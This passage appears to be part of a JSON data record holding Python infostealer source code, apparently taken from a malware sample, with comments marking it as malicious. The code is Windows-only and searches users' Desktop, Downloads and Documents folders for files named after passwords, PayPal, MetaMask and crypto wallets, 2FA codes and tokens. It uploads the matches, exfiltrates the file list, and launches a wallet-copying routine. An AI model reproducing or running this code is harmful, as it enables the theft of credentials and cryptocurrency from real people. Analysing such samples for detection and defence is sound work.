keywords:\n            if worf in file.lower():\n                if os.path.isfile(path + \"/\" + file) and \".txt\" in file:\n                    fifound.append([path + \"/\" + file, bc_uploadanonfiles(path + \"/\" + file)])\n                    break\n                if os.path.isdir(path + \"/\" + file):\n                    target = path + \"/\" + file\n                    # Recursively search folders\n                    break\n    # Exfiltrate file list\n    # ...\n\ndef bc_checking():\n    user = gettempdir().split(\"\\AppData\")[0]\n    path2search = [\n        user + \"/Desktop\",\n        user + \"/Downloads\",\n        user + \"/Documents\"\n    ]\n    key_wordsFiles = [\n        \"passw\", \"mdp\", \"motdepasse\", \"mot_de_passe\", \"login\", \"secret\", \"account\", \"acount\", \"paypal\", \"banque\", \"metamask\", \"wallet\", \"crypto\", \"exodus\", \"discord\", \"2fa\", \"code\", \"memo\", \"compte\", \"token\", \"backup\", \"seecret\"\n    ]\n    wikith = []\n    for patt in path2search:\n        bc_checking = threading.Thread(target=bc_create_file, args=[patt, key_wordsFiles]);bc_checking.start()\n        wikith.append(bc_checking)\n    return wikith\n\n# 7. Main execution: run all malicious routines\nif __name__ == \"__main__\" and os.name == \"nt\":\n    import asyncio\n    asyncio.run(bc_initial_func().init())\n    grabb_GatherAll()\n    DETECTED = False # Trust(Cookies) logic omitted for brevity\n    if not DETECTED:\n        wikith = bc_checking()\n        for thread in wikith: thread.join()\n        time.sleep(0.2)\n        # Exfiltrate file list\n        upload(\"bc_checking\", \"...\")\n        auto = threading.Thread(target=auto_copy_wallet().run)\n        auto.start()\n\n# --- Malicious code ends here ---"
    }
  }
]